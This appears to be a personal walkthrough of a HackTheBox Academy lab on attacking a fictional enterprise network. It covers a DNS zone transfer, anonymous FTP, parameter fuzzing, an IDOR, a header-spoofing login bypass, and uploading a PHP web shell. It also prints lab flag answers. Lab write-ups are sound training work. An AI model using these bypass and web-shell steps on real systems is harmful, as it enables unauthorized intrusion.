---
title: HTBAcademy Attacking Enterprise Networks Walkthrough
date: 2025-03-14 00:00:01 +0800
categories: [HackTheBox]
tags: [HackTheBox]
author: kevin_chen
---

# HTBAcademy Attacking Enterprise Networks Walkthrough

## First Flag

The first flag was found using the following command:

```sh
dig axfr inlanefreight.local @10.129.229.147
```

### Output:
```
; <<>> DiG 9.18.30-0ubuntu0.24.04.2-Ubuntu <<>> axfr inlanefreight.local @10.129.229.147
;; global options: +cmd
inlanefreight.local. 86400 IN SOA ns1.inlanfreight.local. dnsadmin.inlanfreight.local. 21 604800 86400 2419200 86400
inlanefreight.local. 86400 IN NS inlanefreight.local.
inlanefreight.local. 86400 IN A 127.0.0.1
blog.inlanefreight.local. 86400 IN A 127.0.0.1
careers.inlanefreight.local. 86400 IN A 127.0.0.1
dev.inlanefreight.local. 86400 IN A 127.0.0.1
flag.inlanefreight.local. 86400 IN TXT "HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN A 127.0.0.1
ir.inlanefreight.local. 86400 IN A 127.0.0.1
status.inlanefreight.local. 86400 IN A 127.0.0.1
support.inlanefreight.local. 86400 IN A 127.0.0.1
tracking.inlanefreight.local. 86400 IN A 127.0.0.1
vpn.inlanefreight.local. 86400 IN A 127.0.0.1
```

---

## Second Flag

Found using an FTP anonymous login:

```sh
ftp anonymous@ip
get flag.txt
```

---

## Parameter Fuzzing

I used `ffuf` to discover parameters:

```sh
ffuf -u http://careers.inlanefreight.local:80/FUZZ?id=1 -w /home/kchen/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200-299,301,302,307,401,403,405,500
```

### Results:
```
apply        [Status: 200, Size: 16408, Words: 5625, Lines: 265, Duration: 84ms]
login        [Status: 200, Size: 9459, Words: 2752, Lines: 187, Duration: 159ms]
profile      [Status: 200, Size: 10148, Words: 3146, Lines: 195, Duration: 159ms]
register     [Status: 200, Size: 9754, Words: 2772, Lines: 191, Duration: 182ms]
```

I registered an account at:

```
http://careers.inlanefreight.local:80/register?id=1
```

Then, accessing:

```
http://careers.inlanefreight.local:80/profile?id=4
```

gave me the second flag:

```
HTB{8f40ecf17f681612246fa5728c159e46}
```

---

## Exploiting `dev.inlanefreight.local`

Used `ffuf` to discover PHP files:

```
dev.inlanefreight.local/login.php
```

The `GET` request was denied, but after testing various HTTP methods, `TRACK` worked. The request included a header:

```
X-Custom-IP-Authorization: 172.x.x.x
```

Setting it to `127.0.0.1` allowed me to bypass authentication.

---

## File Upload Exploit

I found an image upload feature but it only accepted `image/png`. To bypass this, I:

1. Uploaded a PNG file and recorded the HTTP request in BurpSuite.
2. Modified the file contents to a PHP web shell.
3. Changed the filename extension in BurpSuite to `.php`.
4. Resent the modified request.

The file was uploaded successfully to:

```
/uploads/screenshot.php
```

Executing commands via:

```
http://dev.inlanefreight.local/uploads/screenshot.php?cmd=id
```

---

## Finding the Next Flag

To locate flag files, I ran:

```sh
find / -type f -name "*flag.txt*"
```

Since this was a web shell, I had to URL encode the command before execution.

---
